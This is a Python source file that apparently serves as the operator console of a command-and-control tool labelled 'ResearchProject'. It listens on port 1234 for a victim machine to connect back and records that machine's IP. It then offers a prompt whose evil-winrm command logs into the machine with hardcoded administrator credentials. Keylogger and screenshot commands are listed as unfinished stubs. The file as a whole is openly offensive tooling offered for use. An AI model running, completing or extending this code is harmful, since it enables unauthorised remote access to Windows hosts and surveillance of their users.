import subprocess
import sys
import socket
import getpass

BANNER = r"""
:::::::::  :::::::::: ::::::::  ::::::::::     :::     :::::::::   ::::::::  :::    :::          :::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: :::::::::::
:+:    :+: :+:       :+:    :+: :+:          :+: :+:   :+:    :+: :+:    :+: :+:    :+:          :+:    :+: :+:    :+: :+:    :+:     :+:     :+:       :+:    :+:    :+:     
+:+    +:+ +:+       +:+        +:+         +:+   +:+  +:+    +:+ +:+        +:+    +:+          +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       +:+           +:+      
+#++:++#:  +#++:++#  +#++:++#++ +#++:++#   +#++:++#++: +#++:++#:  +#+        +#++:++#++          +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  +#+           +#+       
+#+    +#+ +#+              +#+ +#+        +#+     +#+ +#+    +#+ +#+        +#+    +#+          +#+        +#+    +#+ +#+    +#+     +#+     +#+       +#+           +#+        
#+#    #+# #+#       #+#    #+# #+#        #+#     #+# #+#    #+# #+#    #+# #+#    #+#          #+#        #+#    #+# #+#    #+# #+# #+#     #+#       #+#    #+#    #+#         
###    ### ########## ########  ########## ###     ### ###    ###  ########  ###    ###          ###        ###    ###  ########   #####      ########## ########     ###   
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    conn.close()
    server.close()

    return target_ip

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def cli(target_ip):
    username = getpass.getuser()
    help_text = """
        Available commands:
        help, h        Show this help menu
        evil-winrm     Connect to target using evil-winrm
        key-logger     To be determined
        screen-shot    To be determined
        exit, q        Exit the console
    """
    print("[*]Type help or h to see all commands...\n")
    while True:
        cmd = input(f"{username}@ResearchProject# ")
        if cmd == "exit" or cmd == "q":
            break
        elif cmd == "help" or cmd == "h":
            print(help_text)
        elif cmd == "evil-winrm":
            connect_evil_winrm(target_ip)
        elif cmd == "key-logger":
            print("In progress...")
        elif cmd == "screen-shot":
            print("In progress...")
        elif cmd == "":
            continue
        else:
            print(f"[-] Unknown command: {cmd}")


def main():
    print(BANNER)
    try:
        target_ip = start_listener()
        cli(target_ip)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    

if __name__ == "__main__":
    main()
